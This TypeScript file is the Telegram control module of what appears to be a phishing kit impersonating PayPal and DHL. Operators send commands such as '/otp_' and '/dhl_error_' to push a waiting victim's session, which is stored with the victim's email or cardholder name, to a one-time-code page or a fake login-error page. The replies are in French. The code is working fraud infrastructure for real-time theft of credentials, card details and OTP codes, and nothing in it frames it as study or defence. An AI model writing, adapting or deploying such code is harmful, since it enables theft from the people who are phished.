import { storage } from "./storage";

interface TelegramUpdate {
  update_id: number;
  message?: {
    message_id: number;
    from?: {
      id: number;
      is_bot: boolean;
      first_name: string;
      username?: string;
    };
    chat: {
      id: number;
      type: string;
    };
    date: number;
    text?: string;
  };
}

let lastUpdateId = 0;
let pollingInterval: NodeJS.Timeout | null = null;

export async function startTelegramBot() {
  const settings = await storage.getAdminSettings();
  
  if (!settings?.telegramBotToken || !settings?.telegramChatId) {
    console.log("Telegram bot not configured");
    return;
  }

  // Stop existing polling if any
  if (pollingInterval) {
    clearInterval(pollingInterval);
  }

  console.log("Starting Telegram bot polling...");

  // Poll for updates every 2 seconds
  pollingInterval = setInterval(async () => {
    try {
      await pollTelegramUpdates(settings.telegramBotToken!);
    } catch (error) {
      console.error("Telegram polling error:", error);
    }
  }, 2000);
}

async function pollTelegramUpdates(botToken: string) {
  try {
    const response = await fetch(
      `https://api.telegram.org/bot${botToken}/getUpdates?offset=${lastUpdateId + 1}&timeout=1`,
      {
        method: "GET",
      }
    );

    const data = await response.json();

    if (data.ok && data.result && data.result.length > 0) {
      for (const update of data.result) {
        await handleTelegramUpdate(update, botToken);
        lastUpdateId = Math.max(lastUpdateId, update.update_id);
      }
    }
  } catch (error) {
    console.error("Failed to poll Telegram updates:", error);
  }
}

async function handleTelegramUpdate(update: TelegramUpdate, botToken: string) {
  const message = update.message;
  if (!message || !message.text) return;

  const text = message.text.trim();
  const chatId = message.chat.id;

  // PayPal commands
  if (text.startsWith("/otp_")) {
    const sessionId = text.replace("/otp_", "");
    await handlePayPalRedirectCommand(sessionId, "/paypal/otp", chatId, botToken);
    return;
  }

  if (text.startsWith("/error_")) {
    const sessionId = text.replace("/error_", "");
    await handlePayPalRedirectCommand(sessionId, "/paypal/failure", chatId, botToken);
    return;
  }

  // DHL commands
  if (text.startsWith("/dhl_otp_")) {
    const sessionId = text.replace("/dhl_otp_", "");
    await handleDhlRedirectCommand(sessionId, "/otp1", chatId, botToken);
    return;
  }

  if (text.startsWith("/dhl_error_")) {
    const sessionId = text.replace("/dhl_error_", "");
    await handleDhlRedirectCommand(sessionId, "/error", chatId, botToken);
    return;
  }

  // Legacy commands without underscore
  if (text.startsWith("/otp ")) {
    const sessionId = text.replace("/otp ", "");
    await handlePayPalRedirectCommand(sessionId, "/paypal/otp", chatId, botToken);
    return;
  }

  if (text.startsWith("/error ")) {
    const sessionId = text.replace("/error ", "");
    await handlePayPalRedirectCommand(sessionId, "/paypal/failure", chatId, botToken);
    return;
  }
}

async function handlePayPalRedirectCommand(
  sessionId: string,
  redirectUrl: string,
  chatId: number,
  botToken: string
) {
  try {
    const session = await storage.getPaypalSession(sessionId);

    if (!session) {
      await sendReply(
        chatId,
        botToken,
        `❌ Session <code>${sessionId}</code> introuvable.`
      );
      return;
    }

    if (session.status !== "waiting") {
      await sendReply(
        chatId,
        botToken,
        `⚠️ Session <code>${sessionId}</code> déjà traitée (${session.status}).`
      );
      return;
    }

    await storage.updatePaypalSession(sessionId, {
      redirectUrl,
      status: "redirected",
    });

    const action = redirectUrl.includes("otp") ? "OTP" : "LOGIN ERROR";
    await sendReply(
      chatId,
      botToken,
      `✅ Client <code>${session.email}</code> redirigé vers <b>${action}</b>`
    );
  } catch (error) {
    console.error("Failed to handle redirect command:", error);
    await sendReply(
      chatId,
      botToken,
      `❌ Erreur lors de la redirection.`
    );
  }
}

async function handleDhlRedirectCommand(
  sessionId: string,
  redirectUrl: string,
  chatId: number,
  botToken: string
) {
  try {
    const session = await storage.getDhlSession(sessionId);

    if (!session) {
      await sendReply(
        chatId,
        botToken,
        `❌ Session <code>${sessionId}</code> introuvable.`
      );
      return;
    }

    if (session.status !== "waiting") {
      await sendReply(
        chatId,
        botToken,
        `⚠️ Session <code>${sessionId}</code> déjà traitée (${session.status}).`
      );
      return;
    }

    await storage.updateDhlSession(sessionId, {
      redirectUrl,
      status: "redirected",
    });

    const action = redirectUrl.includes("otp") ? "OTP" : "ERROR";
    await sendReply(
      chatId,
      botToken,
      `✅ Client <code>${session.cardholderName}</code> redirigé vers <b>${action}</b>`
    );
  } catch (error) {
    console.error("Failed to handle redirect command:", error);
    await sendReply(
      chatId,
      botToken,
      `❌ Erreur lors de la redirection.`
    );
  }
}

async function sendReply(chatId: number, botToken: string, text: string) {
  try {
    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: chatId,
        text,
        parse_mode: "HTML",
      }),
    });
  } catch (error) {
    console.error("Failed to send Telegram reply:", error);
  }
}

export function stopTelegramBot() {
  if (pollingInterval) {
    clearInterval(pollingInterval);
    pollingInterval = null;
    console.log("Telegram bot polling stopped");
  }
}
